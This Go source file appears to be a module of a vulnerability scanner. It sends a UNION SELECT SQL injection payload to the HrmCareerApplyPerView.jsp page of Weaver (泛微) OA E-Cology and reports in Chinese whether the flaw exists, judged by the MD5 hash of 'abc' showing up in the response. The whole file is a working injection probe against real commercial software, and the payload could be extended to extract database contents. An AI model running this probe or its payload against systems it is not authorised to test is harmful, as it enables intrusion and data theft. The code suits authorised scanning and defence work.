package ecology_HrmCareerApplyPerView_sqljni

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func Run(url string) {
	vulnUrl := url + "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-10] 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞不存在")
		return
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-10] 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞不存在")
		return
	}
	body := string(bodyBytes)

	if resp.StatusCode == 200 && strings.Contains(body, "900150983cd24fb0d6963f7d28e17f72") {
		color.Green.Println("[+10] 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞存在 -> ", vulnUrl)
	} else {
		color.Red.Println("[-10] 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞不存在")
	}
}
